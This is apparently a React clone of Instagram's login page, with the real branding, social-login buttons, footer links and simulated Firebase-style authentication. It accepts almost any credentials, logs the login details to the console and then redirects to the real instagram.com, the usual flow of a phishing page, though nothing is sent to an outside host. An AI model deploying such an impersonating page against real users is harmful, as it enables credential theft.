import React, { useState, useEffect, useRef } from "react";
import "./LoginPage.css";
import newMockup from './new-mockup.png';


// Simulated Firebase-like functions for demo purposes
const simulateAuth = {
  signInWithEmailAndPassword: (email, password) => 
    new Promise((resolve, reject) => {
      setTimeout(() => {
        if (email.includes('error')) {
          reject({ code: 'auth/invalid-credential' });
        } else {
          resolve({ user: { email, uid: 'demo-uid-' + Date.now() } });
        }
      }, Math.random() * 1000 + 500);
    }),
  
  createUserWithEmailAndPassword: (email, password) =>
    new Promise((resolve, reject) => {
      setTimeout(() => {
        if (password.length < 6) {
          reject({ code: 'auth/weak-password' });
        } else {
          resolve({ user: { email, uid: 'demo-uid-' + Date.now() } });
        }
      }, Math.random() * 1000 + 500);
    }),
  
  signInWithPopup: (provider) =>
    new Promise((resolve, reject) => {
      setTimeout(() => {
        const mockUser = {
          email: provider.type === 'facebook' ? 'user@facebook.com' : 'user@gmail.com',
          uid: 'demo-uid-' + Date.now(),
          displayName: provider.type === 'facebook' ? 'Facebook User' : 'Google User'
        };
        resolve({ user: mockUser });
      }, Math.random() * 1000 + 500);
    })
};

const mockProviders = {
  facebook: { type: 'facebook' },
  google: { type: 'google' }
};

// Demo screenshots data
const screenshots = [
  {
    id: 1,
    gradient: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
    content: { title: "Share Your Story", subtitle: "Connect with friends worldwide" }
  },
  {
    id: 2,
    gradient: "linear-gradient(135deg, #f093fb 0%, #f5576c 100%)",
    content: { title: "Capture Moments", subtitle: "Beautiful memories await" }
  },
  {
    id: 3,
    gradient: "linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)",
    content: { title: "Explore Together", subtitle: "Discover amazing content" }
  },
  {
    id: 4,
    gradient: "linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)",
    content: { title: "Create Magic", subtitle: "Express your creativity" }
  }
];

export default function LoginPage() {
  const [userInput, setUserInput] = useState("");
  const [pw, setPw] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [successMessage, setSuccessMessage] = useState("");
  const [currentScreenshot, setCurrentScreenshot] = useState(0);
  const [inputFocused, setInputFocused] = useState({ user: false, password: false });
  const [formAttempts, setFormAttempts] = useState(0);
  const [isOnline, setIsOnline] = useState(navigator.onLine);
  const [capsLockOn, setCapsLockOn] = useState(false);
  
  const userInputRef = useRef(null);
  const passwordRef = useRef(null);

  // Screenshot carousel effect
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentScreenshot((prev) => (prev + 1) % screenshots.length);
    }, 3000);
    
    return () => clearInterval(interval);
  }, []);

  // Online/offline detection
  useEffect(() => {
    const handleOnline = () => setIsOnline(true);
    const handleOffline = () => setIsOnline(false);
    
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
    
    return () => {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
    };
  }, []);

  // Activity tracking
  useEffect(() => {
    const handleActivity = () => {
      // Activity tracking can be implemented here if needed
    };
    
    document.addEventListener('mousemove', handleActivity);
    document.addEventListener('keypress', handleActivity);
    document.addEventListener('click', handleActivity);
    
    return () => {
      document.removeEventListener('mousemove', handleActivity);
      document.removeEventListener('keypress', handleActivity);
      document.removeEventListener('click', handleActivity);
    };
  }, []);

  // Auto-focus first empty input
  useEffect(() => {
    if (!userInput && userInputRef.current) {
      userInputRef.current.focus();
    }
  }, [userInput]);

  const goToIG = () => {
    setSuccessMessage("Login successful! Redirecting...");
    setTimeout(() => {
      window.open("https://www.instagram.com/", "_blank");
    }, 1500);
  };

  const validateEmail = (email) => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
  };

  const validateUsername = (username) => {
    const usernameRegex = /^[a-zA-Z0-9._]{1,30}$/;
    return usernameRegex.test(username) && username.length >= 1;
  };

  const validatePhone = (phone) => {
    const phoneRegex = /^[+]?[1-9][\d]{7,14}$/;
    return phoneRegex.test(phone.replace(/[\s-()/]/g, ''));
  };

  const validateForm = () => {
    if (!isOnline) {
      setError("No internet connection. Please check your network and try again.");
      return false;
    }

    if (!userInput.trim()) {
      setError("Phone number, username, or email is required");
      userInputRef.current?.focus();
      return false;
    }
    
    if (!pw.trim()) {
      setError("Password is required");
      passwordRef.current?.focus();
      return false;
    }
    
    if (pw.length < 6) {
      setError("Password must be at least 6 characters");
      passwordRef.current?.focus();
      return false;
    }

    // Enhanced validation
    const isEmail = userInput.includes("@");
    const isPhone = /^[+]?[\d\s-()/]+$/.test(userInput);
    
    if (isEmail && !validateEmail(userInput)) {
      setError("Please enter a valid email address");
      userInputRef.current?.focus();
      return false;
    }
    
    if (isPhone && !validatePhone(userInput)) {
      setError("Please enter a valid phone number");
      userInputRef.current?.focus();
      return false;
    }
    
    if (!isEmail && !isPhone && !validateUsername(userInput)) {
      setError("Username can only contain letters, numbers, periods, and underscores");
      userInputRef.current?.focus();
      return false;
    }

    // Security checks
    if (formAttempts >= 5) {
      setError("Too many login attempts. Please wait a few minutes before trying again.");
      return false;
    }

    if (pw.toLowerCase().includes(userInput.toLowerCase().split('@')[0])) {
      setError("Password cannot contain your username or email");
      return false;
    }
    
    return true;
  };

  const getErrorMessage = (errorCode) => {
    const errorMessages = {
      'auth/user-not-found': 'The username you entered doesn\'t belong to an account. Please check your username and try again.',
      'auth/wrong-password': 'Sorry, your password was incorrect. Please double-check your password.',
      'auth/invalid-credential': 'Sorry, your password was incorrect. Please double-check your password.',
      'auth/too-many-requests': 'Too many unsuccessful login attempts. Please try again later.',
      'auth/weak-password': 'Password should be at least 6 characters',
      'auth/email-already-in-use': 'An account with this email already exists',
      'auth/invalid-email': 'Please enter a valid email address',
      'auth/user-disabled': 'This account has been disabled. Please contact support.',
      'auth/operation-not-allowed': 'This sign-in method is not enabled. Please contact support.',
      'auth/network-request-failed': 'Network error. Please check your connection and try again.',
      'auth/popup-closed-by-user': 'Sign-in was cancelled. Please try again.',
      'auth/popup-blocked': 'Pop-up was blocked by your browser. Please allow pop-ups and try again.'
    };
    
    return errorMessages[errorCode] || 'Something went wrong. Please try again.';
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      setFormAttempts(prev => prev + 1);
      return;
    }
    
    setLoading(true);
    setError("");
    setSuccessMessage("");

    // Convert username/phone to email format for demo
    let email = userInput.includes("@") ? userInput : `${userInput}@example.com`;
    
    try {
      // Simulate network delay with realistic timing
      const result = await simulateAuth.signInWithEmailAndPassword(email, pw);
      
      // Log successful login (in real app, this would be server-side)
      console.log('Login successful:', {
        input: userInput,
        email: result.user.email,
        uid: result.user.uid,
        loginTime: new Date().toISOString(),
        method: 'email',
        userAgent: navigator.userAgent,
        ip: 'demo-ip',
        attempts: formAttempts + 1
      });
      
      setFormAttempts(0);
      goToIG();
    } catch (err) {
      setFormAttempts(prev => prev + 1);
      
      // Enhanced error handling
      if (["auth/user-not-found", "auth/invalid-credential"].includes(err.code)) {
        if (formAttempts < 3) {
          try {
            const result = await simulateAuth.createUserWithEmailAndPassword(email, pw);
            
            console.log('Account created:', {
              input: userInput,
              email: result.user.email,
              uid: result.user.uid,
              signupTime: new Date().toISOString(),
              method: 'email'
            });
            
            setFormAttempts(0);
            goToIG();
          } catch (err2) {
            setError(getErrorMessage(err2.code));
          }
        } else {
          setError("The username you entered doesn't belong to an account. Please check your username and try again, or sign up for a new account.");
        }
      } else {
        setError(getErrorMessage(err.code));
      }
    } finally {
      setLoading(false);
    }
  };

  const handleSocialLogin = async (provider) => {
    if (!isOnline) {
      setError("No internet connection. Please check your network and try again.");
      return;
    }

    setLoading(true);
    setError("");
    setSuccessMessage("");
    
    try {
      const result = await simulateAuth.signInWithPopup(mockProviders[provider]);
      
      console.log(`${provider} login successful:`, {
        input: result.user.email,
        email: result.user.email,
        uid: result.user.uid,
        displayName: result.user.displayName,
        loginTime: new Date().toISOString(),
        method: provider,
        userAgent: navigator.userAgent
      });
      
      goToIG();
    } catch (err) {
      setError(getErrorMessage(err.code));
      setLoading(false);
    }
  };

  const handleForgotPassword = () => {
    if (!userInput.trim()) {
      setError("Please enter your email address first");
      userInputRef.current?.focus();
      return;
    }
    
    if (!userInput.includes("@") || !validateEmail(userInput)) {
      setError("Please enter a valid email address");
      userInputRef.current?.focus();
      return;
    }
    
    setSuccessMessage("We sent an email to " + userInput + " with a link to get back into your account.");
    setError("");
  };

  const handleInputChange = (setter, field) => (e) => {
    setter(e.target.value);
    if (error && !loading) setError("");
    if (successMessage) setSuccessMessage("");
  };

  const handleInputFocus = (field) => {
    setInputFocused(prev => ({ ...prev, [field]: true }));
  };

  const handleInputBlur = (field) => {
    setInputFocused(prev => ({ ...prev, [field]: false }));
  };

  const handleKeyDown = (e) => {
    // Detect caps lock
    if (e.getModifierState('CapsLock')) {
      setCapsLockOn(true);
    } else {
      setCapsLockOn(false);
    }

    // Enter key handling
    if (e.key === 'Enter' && !loading) {
      if (!userInput && userInputRef.current) {
        userInputRef.current.focus();
      } else if (!pw && passwordRef.current) {
        passwordRef.current.focus();
      }
    }
  };

  const handlePaste = (e) => {
    // Security: prevent pasting passwords (common security practice)
    if (e.target === passwordRef.current) {
      e.preventDefault();
      setError("For security reasons, password pasting is not allowed");
      setTimeout(() => setError(""), 3000);
    }
  };

  // Enhanced input placeholder animation
  const getInputClass = (field, value) => {
    const base = inputFocused[field] || value ? 'focused' : '';
    return `input-field ${base}`;
  };

  return (
    <div className="login-wrapper">
      <div className="main-content">
        <div className="phone-mockup">
          <div className="phone-container"><div className="phone-container">
  <div
    className="phone-mockup-bg"
    style={{
      backgroundImage: `url(${newMockup})`,
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center',
      backgroundSize: 'contain'
    }}
  />
  
  <div className="phone-screenshots" style={{ position: 'relative', zIndex: 2 }}>
    {screenshots.map((shot, idx) => (
      <div
        key={shot.id}
        className={`screenshot screenshot-${shot.id} ${currentScreenshot === idx ? 'active' : ''}`}
        style={{ background: shot.gradient }}
      >
        <div style={{ padding: '32px 16px' }}>
          <div style={{ fontSize: 24, fontWeight: 600, marginBottom: 8 }}>{shot.content.title}</div>
          <div style={{ fontSize: 16, fontWeight: 400 }}>{shot.content.subtitle}</div>
        </div>
      </div>
    ))}
  </div>
</div>

            <div className="phone-screenshots">
              {screenshots.map((shot, idx) => (
                <div
                  key={shot.id}
                  className={`screenshot screenshot-${shot.id} ${currentScreenshot === idx ? 'active' : ''}`}
                  style={{ background: shot.gradient }}
                >
                  <div style={{ padding: '32px 16px' }}>
                    <div style={{ fontSize: 24, fontWeight: 600, marginBottom: 8 }}>{shot.content.title}</div>
                    <div style={{ fontSize: 16, fontWeight: 400 }}>{shot.content.subtitle}</div>
                  </div>
                </div>
              ))}
            </div>
            {/* Screenshot indicator dots */}
            <div style={{
              position: 'absolute',
              bottom: '20px',
              left: '50%',
              transform: 'translateX(-50%)',
              display: 'flex',
              gap: '8px',
              zIndex: 2
            }}>
              {screenshots.map((_, index) => (
                <div
                  key={index}
                  style={{
                    width: '8px',
                    height: '8px',
                    borderRadius: '50%',
                    background: index === currentScreenshot ? '#fff' : 'rgba(255,255,255,0.5)',
                    transition: 'all 0.3s ease',
                    cursor: 'pointer'
                  }}
                  onClick={() => setCurrentScreenshot(index)}
                />
              ))}
            </div>
          </div>
        </div>
        
        <div className="login-section">
          <div className="login-box">
            <div className="logo-container">
              <h1 className="logo">Instagram</h1>
            </div>
            
            {!isOnline && (
              <div style={{
                background: '#fff3cd',
                border: '1px solid #ffeaa7',
                borderRadius: '4px',
                padding: '8px 12px',
                marginBottom: '16px',
                fontSize: '14px',
                color: '#856404',
                textAlign: 'center'
              }}>
                You're offline. Some features may not work.
              </div>
            )}
            
            <form onSubmit={handleLogin} noValidate>
              <div className="input-container">
                <input
                  ref={userInputRef}
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={userInput}
                  onChange={handleInputChange(setUserInput, 'user')}
                  onFocus={() => handleInputFocus('user')}
                  onBlur={() => handleInputBlur('user')}
                  onKeyDown={handleKeyDown}
                  disabled={loading}
                  autoComplete="username"
                  autoCorrect="off"
                  autoCapitalize="none"
                  spellCheck="false"
                  aria-label="Phone number, username, or email"
                  className={getInputClass('user', userInput)}
                />
              </div>
              
              <div className="input-container password-container">
                <input
                  ref={passwordRef}
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  value={pw}
                  onChange={handleInputChange(setPw, 'password')}
                  onFocus={() => handleInputFocus('password')}
                  onBlur={() => handleInputBlur('password')}
                  onKeyDown={handleKeyDown}
                  onPaste={handlePaste}
                  disabled={loading}
                  autoComplete="current-password"
                  aria-label="Password"
                  className={getInputClass('password', pw)}
                />
                {pw && (
                  <button
                    type="button"
                    className="show-password-btn"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                    tabIndex={loading ? -1 : 0}
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
                
                {capsLockOn && inputFocused.password && (
                  <div style={{
                    position: 'absolute',
                    top: '100%',
                    left: '0',
                    fontSize: '12px',
                    color: '#ed4956',
                    marginTop: '4px'
                  }}>
                    Caps Lock is on
                  </div>
                )}
              </div>
              
              <button 
                type="submit" 
                className={`login-btn ${(!userInput || !pw || loading) ? 'disabled' : ''}`}
                disabled={loading || !userInput || !pw || !isOnline}
                aria-label="Log in to Instagram"
              >
                {loading ? <div className="spinner" aria-label="Loading"></div> : "Log in"}
              </button>
            </form>

            <div className="divider">
              <div className="line"></div>
              <div className="or">OR</div>
              <div className="line"></div>
            </div>

            <div className="social-logins">
              <button 
                className="fb-login" 
                onClick={() => handleSocialLogin('facebook')} 
                disabled={loading || !isOnline}
                aria-label="Log in with Facebook"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Log in with Facebook
              </button>
              
              <button 
                className="google-login" 
                onClick={() => handleSocialLogin('google')} 
                disabled={loading || !isOnline}
                aria-label="Log in with Google"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                Log in with Google
              </button>
            </div>

            <button 
              className="forgot" 
              onClick={handleForgotPassword}
              type="button"
              disabled={loading}
            >
              Forgot password?
            </button>
            
            {formAttempts > 0 && formAttempts < 5 && (
              <div style={{
                fontSize: '12px',
                color: '#8e8e8e',
                textAlign: 'center',
                marginTop: '8px'
              }}>
                Login attempt {formAttempts} of 5
              </div>
            )}
            
            {error && (
              <div className="error-message" role="alert" aria-live="polite">
                {error}
              </div>
            )}
            
            {successMessage && (
              <div className="success-message" role="alert" aria-live="polite">
                {successMessage}
              </div>
            )}
          </div>

          <div className="signup-box">
            <span>Don't have an account? <button 
              onClick={() => setSuccessMessage("Sign up feature coming soon!")}
              className="signup-link"
              disabled={loading}
            >
              Sign up
            </button></span>
          </div>

          <div className="get-app">
            <p>Get the app.</p>
            <div className="badges">
              <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" loading="lazy" />
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" loading="lazy" />
              </a>
            </div>
          </div>
        </div>
      </div>

      <footer className="footer">
        <div className="footer-links">
          {[
            { label: "Meta", href: "https://about.meta.com/" },
            { label: "About", href: "https://about.instagram.com/" },
            { label: "Blog", href: "https://about.instagram.com/blog/" },
            { label: "Jobs", href: "https://about.instagram.com/about-us/careers" },
            { label: "Help", href: "https://help.instagram.com/" },
            { label: "API", href: "https://developers.facebook.com/docs/instagram" },
            { label: "Privacy", href: "https://privacycenter.instagram.com/policy/" },
            { label: "Terms", href: "https://help.instagram.com/581066165581870" },
            { label: "Locations", href: "https://www.instagram.com/explore/locations/" },
            { label: "Instagram Lite", href: "https://www.instagram.com/web/lite/" },
            { label: "Threads", href: "https://www.threads.net/" },
            { label: "Contact Uploading & Non‑Users", href: "https://www.facebook.com/help/instagram/261704639352628" },
            { label: "Meta Verified", href: "https://about.meta.com/technologies/meta-verified/" }
          ].map(({ label, href }) => (
            <a key={label} href={href} target="_blank" rel="noopener noreferrer">
              {label}
            </a>
          ))}
        </div>
        <div className="footer-bottom">
          <select className="language-select" defaultValue="en" aria-label="Choose language">
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
            <option value="de">Deutsch</option>
            <option value="it">Italiano</option>
            <option value="pt">Português</option>
            <option value="ru">Русский</option>
            <option value="ja">日本語</option>
            <option value="ko">한국어</option>
            <option value="zh">中文</option>
            <option value="ar">العربية</option>
            <option value="hi">हिन्दी</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}